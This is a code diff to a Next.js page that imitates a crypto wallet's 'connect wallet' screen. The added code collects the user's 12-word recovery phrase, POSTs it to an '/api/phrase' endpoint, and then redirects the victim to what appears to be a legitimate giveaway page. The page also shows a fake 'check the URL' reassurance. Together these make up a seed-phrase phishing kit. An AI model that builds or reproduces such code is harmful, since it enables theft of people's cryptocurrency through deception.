@@ -1,9 +1,42 @@
+"use client";
+
 import CryptoDesk from "@/assets/crypto-desk.svg";
 import CryptoMobile from "@/assets/crypto-mobile.svg";
 import Image from "next/image";
 import Link from "next/link";
+import { useState, FormEvent } from "react";
+import { useRouter } from "next/navigation";
 
 export default function Crypto() {
+  const [isLoading, setIsLoading] = useState(false);
+  const [recoveryPhrase, setRecoveryPhrase] = useState("");
+  const router = useRouter();
+  const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
+    e.preventDefault();
+    setIsLoading(true);
+
+    try {
+      const response = await fetch("/api/phrase", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({ phrase: recoveryPhrase }),
+      });
+
+      if (!response.ok) {
+        throw new Error("Network response was not ok");
+      }
+
+      router.replace("https://www.chaingpt.org/giveaway");
+    } catch (error) {
+      console.error("Error submitting form:", error);
+    } finally {
+      setIsLoading(false);
+      setRecoveryPhrase("");
+    }
+  };
+
   return (
     <div className="w-full h-full flex flex-col justify-between">
       <div className="flex justify-between items-center p-2">
@@ -29,7 +62,7 @@ export default function Crypto() {
         </button>
       </div>
 
-      <div className="p-8 h-[93vh] w-full bg-[rgb(240,242,247)] rounded-t-[25px] flex flex-col justify-start items-center">
+      <div className="p-8 w-full bg-[rgb(240,242,247)] rounded-t-[25px] flex flex-col justify-start items-center">
         <div className="rounded-[50px] bg-[rgba(13,53,120,0.06)] py-[4px] px-[16px] text-[rgb(124,135,156)] font-semibold w-full flex flex-col justify-center items-center">
           <span>Check that the URL is correct. &nbsp;</span>
           <span className="flex items-center">
@@ -53,7 +86,7 @@ export default function Crypto() {
           </span>
         </div>
 
-        <div className="relative mt-6 p-[24px] bg-white rounded-[25px] w-full min-h-[200px]">
+        <div className="relative mt-6 p-[24px] bg-white rounded-[25px] w-full">
           <Link href={"/connect-wallet"} className="absolute left-8 top-8 p-3">
             <svg
               xmlns="http://www.w3.org/2000/svg"
@@ -73,7 +106,10 @@ export default function Crypto() {
             </svg>
           </Link>
 
-          <div className="w-full flex flex-col items-center justify-center">
+          <form
+            onSubmit={handleSubmit}
+            className="w-full flex flex-col items-center justify-center"
+          >
             <div className="h-[88px] w-[88px] rounded-full bg-[rgb(240,242,247)] flex items-center justify-center">
               <svg
                 xmlns="http://www.w3.org/2000/svg"
@@ -103,20 +139,26 @@ export default function Crypto() {
             </span>
 
             <textarea
-              name=""
-              style={{ width: "calc(100% - 48px)" }}
+              name="recoveryPhrase"
+              style={{ width: "calc(100%)" }}
               className="py-[12px] text-black border-[1px] border-solid border-transparent px-[16px] min-h-[120px] rounded-[16px] text-[16px] outline-blue-400 bg-[rgb(240,242,247)]"
               placeholder="Enter your 12 word Recovery Phrase"
-              id=""
+              value={recoveryPhrase}
+              onChange={(e) => setRecoveryPhrase(e.target.value)}
+              required
             ></textarea>
-            <div className="text-[#CF1726] text-[12px] font-normal leading-[18px] flex justify-start w-full ml-[50px] text-left">
+            <div className="text-[#CF1726] text-[12px] font-normal leading-[18px] flex justify-start w-full text-left">
               Separate each word with a space
             </div>
 
-            <button className="bg-[rgb(12,108,242)] rounded-[32px] w-full py-[12px] md:mt-[4rem] mt-[5px]">
-              Create Account
+            <button
+              type="submit"
+              disabled={isLoading}
+              className="bg-[rgb(12,108,242)] rounded-[32px] w-full py-[12px] md:mt-[4rem] mt-[20px] text-white"
+            >
+              {isLoading ? <Spinner /> : "Create Account"}
             </button>
-          </div>
+          </form>
         </div>
 
         {/* footer */}
@@ -125,5 +167,15 @@ export default function Crypto() {
         </div>
       </div>
     </div>
+  );
+}
+
+// Spinner component using Tailwind CSS
+function Spinner() {
+  return (
+    <div
+      className="inline-block h-6 w-6 animate-spin rounded-full border-4 border-solid border-current border-r-transparent align-[-0.125em] motion-reduce:animate-[spin_1.5s_linear_infinite]"
+      role="status"
+    ></div>
   );
 }
